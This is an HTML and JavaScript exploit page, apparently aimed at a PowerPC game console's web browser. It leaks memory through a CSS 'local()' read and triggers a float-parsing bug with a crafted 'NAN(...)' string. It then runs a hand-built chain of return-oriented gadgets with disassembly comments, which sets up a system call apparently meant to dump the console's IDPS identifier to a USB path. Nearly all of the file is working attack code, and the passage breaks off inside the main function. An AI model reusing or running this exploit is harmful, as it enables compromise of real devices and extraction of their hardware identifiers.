<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>

//var blr = unescape("\u4E80\u0020");
//var mtspr = unescape("\u7C08\u03A6");
//var nop = unescape("\u6000\u0000");

function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

function bin2unescape(str, n) {
   var a = [], start=0;
   while(start<str.length) {
   if (a === "\0") {
    str.replace("\0", "\\0");
   }
      a.push(str.slice(start, start+n));
      start+=n;
   }
   return (a.join("" + "\\u"));
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,search_base,search_size,pattern,len)
{
	try
	{
		//var search_base = 0x80150000;
		//var search_size = 0x450000;
		
		var dat = readMemory(search_base, search_size);
		
		// move past "local("
		dat = dat.substr(6, search_size);
		
		// loop for tag
		for (var i = 0; i < (search_size*2); i += 0x10)
		//for (var i = 0; i < (20000*0x10); i += 0x8)
		{
			//if (i > 20000*0x10) {return 0;}
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				
				// loop next 5 bits
				for (var k = 0; k < len; k+=2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					//dbg("Loop: "+(i/0x10));
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		dbg("The string variable named " + name + " could not be located in the search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		//var gadget,payload,orig_stack_frame,idps_storage_usb,idps_hex,idps_base,usb_generic_storage,jump_2,jump_1,g,j1,j2;
		//var gadget,payload,orig_stack_frame,orig_link_register,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
		var gadget,payload,idps_storage_usb,idps_hex,idps_base,jump_2,jump_1,g,j1,j2;
		var payload_addr=0;		
		//var orig_stack_frame_addr = 0;
		//var orig_link_register_addr = 0;
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		var idps_storage_usb_addr=0;
		var idps_hex_addr=0;
		var idps_base_addr=0;
		//var usb_generic_storage_addr = 0;

		// Find Payload Pointer Address
		dbg("Processing payload string.. Searching for valid offset....");
		
		do{
		payload =  unescape("\u2F2A\u3860\u1004\u3880\u000A\u38A0\u01B6\u3960\u0188\u4400\u0002\u4E80\u0020\u2F2A"); // 16 total bytes after placeholder
		payload_addr = findExploit("payload",payload,0x80150000,0x450000,0x2F2A,0x18);
		}
		while(payload_addr==0);
		
		/*
		// Find Initial Stack Frame Address Pointer
		// 0x8FD8D5C0 / 0x8FD8F9C0 <-- r1 should be this
		dbg("Processing orig_stack_frame strings.. Searching for valid offset....");
		do{
		orig_stack_frame =  unescape("\uDEAD\u0000\u0000\u8FD8\uD550\uDEAD"); // <-- must point to r1-0x70 [0x8FD8D550]
		orig_stack_frame_addr = findExploit("orig_stack_frame",orig_stack_frame,0x80150000,0x450000,0xDEAD,0x8);
		}
		while(orig_stack_frame_addr==0);
		*/
		
		/*
		// Find Initial Link Register Address Pointer
		// 0x038CE218 / 0x03B2C9D4 <-- lr should be this???
		dbg("Processing orig_link_register strings.. Searching for valid offset....");
		do{
		orig_link_register =  unescape("\uFEED\u0000\u0000\u8FD8\uD5D0\uFEED");
		orig_link_register_addr = findExploit("orig_link_register",orig_link_register,0x80150000,0x450000,0xFEED,0x8);
		}
		while(orig_link_register_addr==0);
		*/
		
		// Find IDPS USB Storage Address
		/*
		/dev_usb000/idps.bin
		\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E
		*/
		dbg("Processing idps_storage_usb strings.. Searching for valid offset....");
		do{
		idps_storage_usb =  unescape("\u2220\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E\u2220");
		idps_storage_usb_addr = findExploit("idps_storage_usb",idps_storage_usb,0x80150000,0x450000,0x2220,0x14);
		}
		while(idps_storage_usb_addr==0);
		
		// Find IDPS Hex Bytes Address
		dbg("Processing idps_hex strings.. Searching for valid offset....");
		do{
		idps_hex =  unescape("\u2F4A\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u2F4A");
		idps_hex_addr = findExploit("idps_hex",idps_hex,0x80150000,0x450000,0x2F4A,0x10);
		}
		while(idps_hex_addr==0);
		
		// Find IDPS Base Address Pointer [0x00735F98]
		dbg("Processing idps_base strings.. Searching for valid offset....");
		do{
		idps_base =  unescape("\u2F5A\u0000\u0000\u0073\u5F98\u2F5A");
		idps_base_addr = findExploit("idps_base",idps_base,0x80150000,0x450000,0x2F5A,0x8);
		}
		while(idps_base_addr==0);
		
		/*
		// Find USB Generic Storage Address Pointer
		// \u2F64\u6576\u5F75\u7362 <-- /dev_usb
		dbg("Processing usb_generic_storage strings.. Searching for valid offset....");
		do{
		usb_generic_storage =  unescape("\uDEDD\u2F64\u6576\u5F75\u7362\uDEDD");
		usb_generic_storage_addr = findExploit("usb_generic_storage",usb_generic_storage,0x80150000,0x450000,0xDEDD,0x8);
		}
		while(usb_generic_storage_addr==0);
		*/
		
		//gadget =  unescape("\u7E2F\u006F\uC0F0\u7E2F"); //for DEX - libc memcpy
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// **************************************************************************************
		// DEX
		// execute gadget #1
		// gadget entry
		/*
		00416BF4 7C0802A6 mfspr      r0,lr
		00416BF8 F821FF91 stdu       r1,-0x70(r1)
		00416BFC F8010080 std        r0,0x80(r1) <-- link register address should be 0x8FD8D5D0
		00416C00 7C832378 mr         r3,r4
		00416C04 7CA42B78 mr         r4,r5
		00416C08 81690034 lwz        r11,0x34(r9)
		00416C0C 81490038 lwz        r10,0x38(r9)
		00416C10 80A90014 lwz        r5,0x14(r9)
		00416C14 80C90028 lwz        r6,0x28(r9)
		00416C18 80E90024 lwz        r7,0x24(r9)
		00416C1C 800B0000 lwz        r0,0x0(r11)
		00416C20 F8410028 std        r2,0x28(r1)
		00416C24 7C0903A6 mtspr      ctr,r0
		00416C28 8109002C lwz        r8,0x2C(r9)
		00416C2C 804B0004 lwz        r2,0x4(r11)
		00416C30 81290030 lwz        r9,0x30(r9)
		00416C34 4E800421 bctrl
		*/
		gadget =  unescape("\u4444\u0041\u6BF4");// r0 [gadget #1]
		
		
		// execute gadget #2
		/*
		00010B24 E80B0010 ld         r0,0x10(r11)                  03 (00010B20) REG PIPE LSU
		00010B28 7C0803A6 mtspr      lr,r0                         01 (00010B24) REG
		00010B2C EBEBFFF8 ld         r31,-0x8(r11)
		00010B30 7D615B78 mr         r1,r11
		00010B34 4E800020 blr 
		*/
		
		// r2 before gadget #1 <-- also used as bridge to gadget #2 after saving stack frame
		gadget =  gadget+unescape("\u0001\u0B24");// r0 [gadget #2]
		
		gadget =  gadget+unescape("\u0073\u5F98");// r2 after gadget #1
		
		gadget =  gadget+unescape("\u4441\u4341\u4241\u4141");// padding
		
		
		// execute gadget #3
		/*
		0051A3A4 E80100C0 ld         r0,0xC0(r1)                    PIPE
		0051A3A8 7C6307B4 extsw      r3,r3
		0051A3AC EB810090 ld         r28,0x90(r1)
		0051A3B0 EBA10098 ld         r29,0x98(r1)
		0051A3B4 7C0803A6 mtspr      lr,r0
		0051A3B8 EBC100A0 ld         r30,0xA0(r1)
		0051A3BC EBE100A8 ld         r31,0xA8(r1)                   PIPE
		0051A3C0 382100B0 addi       r1,r1,0xB0
		0051A3C4 4E800020 blr 
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0051\uA3A4");// set r0 from r11+0x10 [gadget #3]
		
		// padding
		gadget =  gadget+unescape("\uDDDD\uEEEE\uF111\uF222\uF333\uF444\uF555\uF666\uF777\uF888\uF999\uFAAA\uFBBB\uFCCC\uFDDD\uFEEE\uE111\uE222\uE333\uE444\uE555\uE666\uE777\uE888\uE999\uEAAA\uEBBB\uECCC\uEDDD\uEEEE\uD111\uD222\uD333\uD444\uD555\uD666\uD777\uD888\uD999\uDAAA\uDBBB\uDCCC\uDDDD\uDEEE\u4841\u4141\u4148\u4949\u4949\u4949\u4949\u4441\u4141\u4241\u4241\u4141\u4144\u5555\u5555\u5555");
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");// r28
		gadget =  gadget+unescape("\uFFFF\u0000\u0000\u1004");// r29 <-- sets r3 in gadget #4 [set high bytes to 00000000]
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31
		
		gadget =  gadget+unescape("\uA555\uA666\uA777\uA888\uA999\uAAAA\uABBB\uACCC");// padding
		
		
		// execute gadget #4
		/*
		
		006161B8 81610074 lwz        r11,0x74(r1)
		006161BC 81410078 lwz        r10,0x78(r1)                   PIPE
		006161C0 8101007C lwz        r8,0x7C(r1)
		006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE
		006161C8 80C10084 lwz        r6,0x84(r1)
		006161CC 80A10088 lwz        r5,0x88(r1)                    PIPE
		006161D0 8081008C lwz        r4,0x8C(r1)
		006161D4 80610090 lwz        r3,0x90(r1)                    PIPE
		006161D8 81210094 lwz        r9,0x94(r1)
		006161DC 80010070 lwz        r0,0x70(r1)                    PIPE
		006161E0 913F0024 stw        r9,0x24(r31)
		006161E4 901F0000 stw        r0,0x0(r31)                    PIPE
		006161E8 917F0004 stw        r11,0x4(r31)
		006161EC 915F0008 stw        r10,0x8(r31)                   PIPE
		006161F0 911F000C stw        r8,0xC(r31)
		006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE
		006161F8 90DF0014 stw        r6,0x14(r31)
		006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE
		00616200 909F001C stw        r4,0x1C(r31)
		00616204 907F0020 stw        r3,0x20(r31)                   PIPE
		00616208 E80100D0 ld         r0,0xD0(r1)
		0061620C 7FA307B4 extsw      r3,r29
		00616210 EBC100B0 ld         r30,0xB0(r1)
		00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE
		00616218 7C0803A6 mtspr      lr,r0
		0061621C EBE100B8 ld         r31,0xB8(r1)
		00616220 382100C0 addi       r1,r1,0xC0
		00616224 4E800020 blr         
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0061\u61B8");// r0 [gadget #4]
		
		// padding
		gadget =  gadget+unescape("\u9333\u9444\u9555\u9666\u9777\u9888\u9999\u9AAA\u9BBB\u9CCC\u9DDD\u9EEE\u8111\u8222\u8333\u8444\u8555\u8666\u8777\u8888\u8999\u8AAA\u8BBB\u8CCC\u8DDD\u8EEE\u7111\u7222\u7333\u7444\u7555\u7666\u7777\u7888\u7999\u7AAA\u7BBB\u7CCC\u7DDD\u7EEE\u6111\u6222\u6333\u6444");
		
		gadget =  gadget+unescape("\u8020\u0000");// r0 temp
		gadget =  gadget+unescape("\u0000\u0188");// r11 <-- syscall number
		gadget =  gadget+unescape("\u8020\u0100");// r10
		gadget =  gadget+unescape("\u8020\u0080");// r8
		gadget =  gadget+unescape("\u8020\u0070");// r7
		gadget =  gadget+unescape("\u8020\u0060");// r6
		gadget =  gadget+unescape("\u0000\u01B6");// r5 <-- syscall arg #3
		gadget =  gadget+unescape("\u0000\u000A");// r4 <-- syscall arg #2
		gadget =  gadget+unescape("\u0000\u1004");// r3 <-- syscall arg #1
		gadget =  gadget+unescape("\u8020\u0090");// r9
		
		gadget =  gadget+unescape("\u5BBB\u5CCC\u5DDD\u5EEE\u4111\u4222\u4333\u4444");// padding
		gadget =  gadget+unescape("\uFFFF\uFFFF\u8020\u0030");// r29 <-- sets r3 in gadget #5 [set high bytes to 00000000]
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31
		gadget =  gadget+unescape("\u3333\u3444\u3555\u3666\u3777\u3888\u3999\u3AAA");// padding
		
		
		
		// execute gadget #5
		/*
		00495B50 44000002 sc
		00495B54 E80100C0 ld         r0,0xC0(r1)
		00495B58 7FA307B4 extsw      r3,r29
		00495B5C EB210078 ld         r25,0x78(r1)
		00495B60 EB410080 ld         r26,0x80(r1)
		00495B64 7C0803A6 mtspr      lr,r0
		00495B68 EB610088 ld         r27,0x88(r1)
		00495B6C EB810090 ld         r28,0x90(r1)
		00495B70 EBA10098 ld         r29,0x98(r1)
		00495B74 382100B0 addi       r1,r1,0xB0
		00495B78 4E800020 blr
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0049\u5B50");// r0 [gadget #5]
		
		// padding
		gadget =  gadget+unescape("\u2111\u2222\u2333\u2444");
		gadget =  gadget+unescape("\u2555\u2666\u2777\u2888");
		gadget =  gadget+unescape("\u2999\u2AAA\u2BBB\u2CCC");// r2
		gadget =  gadget+unescape("\u2DDD\u2EEE\u1111\u1222\u1333\u1444\u1555\u1666\u1777\u1888\u1999\u4242\u4343\u4545\u4646\u4848\u4949\u5242\u5343\u5545\u5646\u5848\u5949\u6242\u6343\u6545\u6646\u6848\u6949\u1AAA\u1BBB\u1CCC\u1DDD\u1EEE");
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0250");// r25 [gadget#7]
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0260");// r26 [gadget#7]
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0270");// r27 [gadget#7]
		gadget =  gadget+unescape("\u4141\u4141");// padding
		
		
		// execute gadget #6
		/*
		038CE218 E8410028 ld         r2,0x28(r1)
		038CE21C 39600000 li         r11,0x0
		038CE220 E8010090 ld         r0,0x90(r1)
		038CE224 79630020 clrldi     r3,r11,32                     01 (038CE21C) REG
		038CE228 38210080 addi       r1,r1,0x80
		038CE22C 7C0803A6 mtspr      lr,r0
		038CE230 4E800020 blr
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0049\u5B74");// r0 [gadget #6]
		
		gadget =  gadget+unescape("\u4848\u4848\u4949\u4949");// r29 [gadget#7]
		
		gadget =  gadget+unescape("\u4949\u4949\u5151\u5151\u5151");
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u5252\u5252\u5252\u5353\u5353\u5353\u4141\u4141\u5454");
		
		
		// execute gadget #7
		
		/*
		038CE840 78030020 clrldi     r3,r0,32                      01 (038CE83C) REG
		038CE844 E80100A0 ld         r0,0xA0(r1)
		038CE848 EBA10078 ld         r29,0x78(r1)
		038CE84C EBC10080 ld         r30,0x80(r1)                   PIPE
		038CE850 7C0803A6 mtspr      lr,r0
		038CE854 EBE10088 ld         r31,0x88(r1)
		038CE858 38210090 addi       r1,r1,0x90
		038CE85C 4E800020 blr
		*/
		//gadget =  gadget+unescape("\u0000\u0000\uBABE\uCAFE");// r0 [gadget #7]
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE1B4"); // graceful exit test #1
		//gadget =  gadget+unescape("\u0000\u0000\u03C1\u654C"); // graceful exit test #2
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE218"); // graceful exit test #3
		//gadget =  gadget+unescape("\u0000\u0000\u0381\u6638");// graceful exit test #4
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE2AC");// graceful exit test #5
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE840");// graceful exit test #6
		gadget =  gadget+unescape("\u0000\u0000\u0049\u5B74");// graceful exit test #7
		
		
		gadget =  gadget+unescape("\u0000\u0000\u5151\u5151");// 
		gadget =  gadget+unescape("\u0000\u0000\u5251\u5251");// 
		gadget =  gadget+unescape("\u0000\u0000\u5351\u5351");// 
		gadget =  gadget+unescape("\u0000\u0000\u5451\u5451");// 
		gadget =  gadget+unescape("\u0000\u0000\u5551\u5551");// 
		
		// padding
		gadget =  gadget+unescape("\u4949\u4949\u4949\u5151\u5151\u5151\u4141\u4141\u5252\u5252\u5252\u5353\u5353\u5353\u4141\u4141\u5454\u5555\u4141\u4141\u5656\u5656\u5656\u5858\u5858\u5858\u5858\u5959");
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");// r29
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31
		
		gadget =  gadget+unescape("\u0049\u5B74\u1111\uF111\uF222\uF333");// padding
		
		
		// execute gadget #8
		/*
		03C16638 7C601B78 mr         r0,r3
		03C1663C 78030020 clrldi     r3,r0,32                      01 (03C16638) REG PIPE
		03C16640 E8010090 ld         r0,0x90(r1)
		03C16644 38210080 addi       r1,r1,0x80
		03C16648 7C0803A6 mtspr      lr,r0                         01 (03C16640) REG
		03C1664C 4E800020 blr 
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0049\u5B74");// r0 [gadget #8]
		
		gadget =  gadget+unescape("\uF444\uF333\uFAAA\uFBBB\uFCCC\uFDDD\uF111\u1111\u1222\u1333\u1444\u1555\u1666\u1666\u1444\u1333\u1AAA\u1BBB\u1CCC\u1DDD\u1111\uD111\uD222\uD333\uD444\uD555\uD666\uD666\uD444\uD333\uDAAA\uDBBB\uDCCC\uDDDD\uD111\uC111\uC222\uC333\uC444\uC555\uC666\uC666\uC444\uC333\uCAAA\uCBBB\uCCCC\uCDDD\uC111\uB111\uB222\uB333\uB444\uB555\uB666\uB666\uB444\uB333\uBAAA\uBBBB");
		
		
		// execute gadget #9
		/*
		
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0049\u5B74");// r0 [gadget #9]
		
		gadget =  gadget+unescape("\uA222\uA333\uA444\uA555\uA666\uA666\uA444\uA333\uAAAA\uABBB\uACCC\uADDD\uA111\u3111\u3222\u3333\u3444\u3555\u3666\u3666\u3444\u3333\u3AAA\u3BBB\u3CCC\u3DDD\u3111\u4111\u4222\u4333\u4444\u4555\u4666\u4666\u4444\u4333\u4AAA\u4BBB\u4CCC\u4DDD\u4111\u6111\u6222\u6333\u6444\u6555\u6566\u6666\u6444\u6333\u6AAA\u6BBB\u6CCC\u6DDD\u6111\u6111\u6222\u6333\u6444\u6555\u6466\u6666\u6444\u6333\u6AAA\u6BBB\u6CCC\u6DDD\u6111\u5141\u4145\u6141\u4146\u8141\u4148\u5666\u5444\u5333\u5AAA\u5BBB\u5CCC\u5DDD\u5111\u4111\u4222\u4333\u4444\u4555\u4666\u4666\u4444\u4333\u4AAA\u4BBB\u4CCC\u4DDD\u4111\u3111\u3222\u3333\u3444\u3555\u3666\u3666\u3444\u3333\u3AAA\u3BBB\u3CCC\u3DDD\u3111\u2111\u2222\u2333\u2444\u2555\u2666\u2666\u2444\u2333\u2AAA\u2BBB\u2CCC\u2DDD\u2111\u1111\u1222\u1333\u1444\u1555\u1666\u1666\u1444\u1333\u1AAA\u1BBB\u1CCC\u1DDD\u1111");
		
		// **************************************************************************************
		
		
		// **************************************************************************************
		// padding + find marker NEW
		gadget =  gadget+unescape("\u4141\u4141\u696A\u696B\u4141\u4141\u7E2A"); // 14 bytes
		// **************************************************************************************
		
		
		// CEX
		//gadget =  unescape("\u4444\u0009\u7604\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump
		//gadget =  gadget+unescape("\u01c5\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes
		//gadget =  gadget+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0000\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0056\u8C94\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0000\u0909\u0909\u4141"); //122 bytes
		//gadget =  gadget+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes
		
		
		// write found payload address
		//gadget = gadget.replaceAt(285, hexh2bin((payload_addr) >> 16));
		//gadget = gadget.replaceAt(286, hexh2bin(payload_addr));
		//gadget = gadget.replaceAt(287, hexh2bin((payload_addr) >> 16));
		//gadget = gadget.replaceAt(288, hexh2bin(payload_addr));
		
		
		// Write found addresses to gadgets hex
		// BABECAFE 3133065982
		// DEADBEEF 3735928559
		// A55FACE5 2774510821
		
		//                                 [dummy	gadget	register]
		// FEED0428 <--placeholder example [FEED	04		28		]
		
		//-------------------------------------------------------------------
		// write to gadget #1
		
		// write found address to r2
		//gadget = gadget.replaceAt(3, hexh2bin((4276945154) >> 16));
		//gadget = gadget.replaceAt(4, hexh2bin(4276945154));
		//-------------------------------------------------------------------
		
		
		
		// Find Gadgets Pointer
		dbg("Processing gadget string.. Searching for valid offset....");
		do{
		g = gadget.replaceAt(0x00/2,hexh2bin(0x7E2A));
		gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x1B8);
		//gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x644);
		}
		while(gadget_addr==0);
		
		
		// Find jump_2 Address
		dbg("Processing jump_2 string.. Searching for valid offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u8FD8\uD5D0\u4141\u4141\u4141\u4141\u4141\u4141\u4407\u4407\u4406\u4406\u8FD8\uF9C0\u03A9\uF7E8\u4343\u4343\u4410\u4410\u4141\u4141\u4141\u4444\u2A2F");// putting orig stack address value into r8
		
		//jump_2 = jump_2.replaceAt(11, hexh2bin((gadget_addr+36) >> 16));
		//jump_2 = jump_2.replaceAt(12, hexh2bin(gadget_addr+36));// r5
		
		//jump_2 = jump_2.replaceAt(19, hexh2bin((idps_hex_addr) >> 16));
		//jump_2 = jump_2.replaceAt(20, hexh2bin(idps_hex_addr));// r7
		
		//jump_2 = jump_2.replaceAt(21, hexh2bin((idps_storage_usb_addr) >> 16));
		//jump_2 = jump_2.replaceAt(22, hexh2bin(idps_storage_usb_addr));// r6
		
		//jump_2 = jump_2.replaceAt(23, hexh2bin((gadget_addr+12) >> 16));
		//jump_2 = jump_2.replaceAt(24, hexh2bin(gadget_addr+12));// r8
		
		jump_2 = jump_2.replaceAt(25, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(26, hexh2bin(gadget_addr));// used for initial launch and setting r9 after gadget #1
		
		jump_2 = jump_2.replaceAt(27, hexh2bin((gadget_addr+4) >> 16));
		jump_2 = jump_2.replaceAt(28, hexh2bin(gadget_addr+4));// r11+0x4 <-- rewrite gadget hex address here after first gadget to fix r11
		
		//jump_2 = jump_2.replaceAt(29, hexh2bin((orig_stack_frame_addr) >> 16));
		//jump_2 = jump_2.replaceAt(30, hexh2bin(orig_stack_frame_addr));// r10
		
		do{
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x80150000,0x450000,0x2A2F,0x1C);
		}
		while(jump_2_addr==0);
		
		// Find jump_1 Address
		dbg("Processing jump_1 string.. Searching for valid offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{

		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x80150000,0x450000,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		
		// Debug Output To Python
		dbg("                                                ");
		dbg("------------------------------------------------");
		dbg("All required offsets have been found....");
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- GADGETS ------------------------------------");
		dbg("gadget: "+s2hex(gadget));
		dbg("gadget (g): "+s2hex(g));
		dbg("                                                ");
		dbg("--- GADGETS CONTINUED---------------------------");
		dbg("payload: "+s2hex(payload));
		//dbg("orig_stack_frame: "+s2hex(orig_stack_frame));
		//dbg("orig_link_register: "+s2hex(orig_link_register));
		dbg("jump_2: "+s2hex(j2));
		dbg("jump_1: "+s2hex(j1));
		dbg("idps_storage_usb: "+s2hex(idps_storage_usb));
		dbg("idps_hex: "+s2hex(idps_hex));
		dbg("idps_base: "+s2hex(idps_base));
		//dbg("usb_generic_storage: "+s2hex(usb_generic_storage));
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- OFFSETS ------------------------------------");
		dbg("gadget offset: 0x"+gadget_addr.toString(16));
		dbg("payload offset: 0x"+payload_addr.toString(16));
		//dbg("orig_stack_frame_addr offset: 0x"+orig_stack_frame_addr.toString(16));
		//dbg("orig_link_register_addr offset: 0x"+orig_link_register_addr.toString(16));
		dbg("jump_2 offset: 0x"+jump_2_addr.toString(16));
		dbg("jump_1 offset: 0x"+jump_1_addr.toString(16));	
		dbg("idps_storage_usb_addr offset: 0x"+idps_storage_usb_addr.toString(16));	
		dbg("idps_hex_addr offset: 0x"+idps_hex_addr.toString(16));
		dbg("idps_base_addr offset: 0x"+idps_base_addr.toString(16));
		//dbg("usb_generic_storage_addr offset: 0x"+usb_generic_storage_addr.toString(16));
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("Triggering exploit....");
		
		
		trigger(jump_1_addr);				
		
		
		// Debug Output on return from trigger
		dbg("...M                                            ");
		dbg("......A                                         ");
		dbg(".........G                                      ");
		dbg("............I                                   ");
		dbg("...............C                                ");
		dbg("                                                ");
		dbg("...............M  A  G  I  C                    ");
		dbg("...............M..A  G  I  C                    ");
		dbg("...............M..A..G  I  C                    ");
		dbg("...............M..A..G..I  C                    ");
